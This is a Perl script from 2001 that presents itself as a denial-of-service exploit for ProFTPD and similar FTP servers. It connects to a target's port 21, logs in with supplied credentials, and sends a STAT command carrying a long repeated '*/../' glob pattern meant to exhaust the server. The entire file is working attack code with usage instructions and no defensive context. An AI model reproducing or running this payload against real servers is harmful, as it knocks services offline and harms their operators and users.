#!/usr/bin/perl

# little perl script that exploits the dos vulnerability in proftpd and possible others
# coded By speedy
# Cheers to #linux@quicknet =)
# (c) 2001 dutchriot.com

print "======================================================================\n";
print "= Ftpd Dos By SpEeDy http://www.dutchriot.com                        =\n";
print "= Use perl ftpsed.pl <www.yerserver.com> <username> <password>       =\n";
print "======================================================================\n\n";

use Socket;
$remote=$ARGV[0];
$port = "21";
$rlogin=$ARGV[1];
$rpass=$ARGV[2];

$iaddr = inet_aton($remote) or die "Error: $!";
$paddr = sockaddr_in($port, $iaddr) or die "Error: $!";
$proto = getprotobyname('tcp') or die "Error: $!";

socket(SOCK, PF_INET, SOCK_STREAM, $proto) or die "Error: $!";
connect(SOCK, $paddr) or die "Error: $!";;
$sed = "USER $rlogin\n"; 
send(SOCK, $sed, 0) or die "Unable to send packet: $!";
$sed = "PASS $rpass\n";
send(SOCK, $sed, 0) or die "Unable to send packet: $!";
$sed = "stat */../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*\n";
send(SOCK, $sed, 0) or die "Unable to send packet: $!";

while (<SOCK>) {
   print; 
}
print "done. please visit http://www.dutchriot.com\n";   
exit;               
